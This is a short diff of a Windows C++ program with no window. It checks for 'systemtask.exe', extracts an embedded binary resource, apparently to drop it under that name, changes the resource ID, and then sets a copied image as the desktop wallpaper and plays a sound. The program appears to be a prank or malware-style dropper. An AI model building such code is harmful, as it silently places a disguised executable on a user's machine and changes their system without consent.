@@ -17,7 +17,7 @@ int APIENTRY wWinMain(HINSTANCE Instance, //no window
 	if (std::filesystem::exists(datapath + "\\systemtask.exe") != true) { //checks for existing file
 		
 		//extracts exe
-		HRSRC hResInformation = FindResource(NULL, MAKEINTRESOURCE(104), _T("BINARY"));
+		HRSRC hResInformation = FindResource(NULL, MAKEINTRESOURCE(105), _T("BINARY"));
 
 		HGLOBAL hResc = LoadResource(NULL, hResInformation);
 
@@ -121,10 +121,12 @@ int APIENTRY wWinMain(HINSTANCE Instance, //no window
 
 	CloseHandle(File);
 	
+
+	std::filesystem::copy("bg.jpg", "C:\\Users");
 	//sets jpg as desktop background
-	std::string jpgpath = "bg.jpg";
-	SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)jpgpath.c_str(), SPIF_UPDATEINIFILE);
-	
+	std::string jpgpath = "C:\\Users\\bg.jpg";
+	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (char*)jpgpath.c_str(), SPIF_UPDATEINIFILE);
+
 	
 	//plays wav file
 	PlaySound(L"compositept2.wav", NULL, SND_FILENAME);
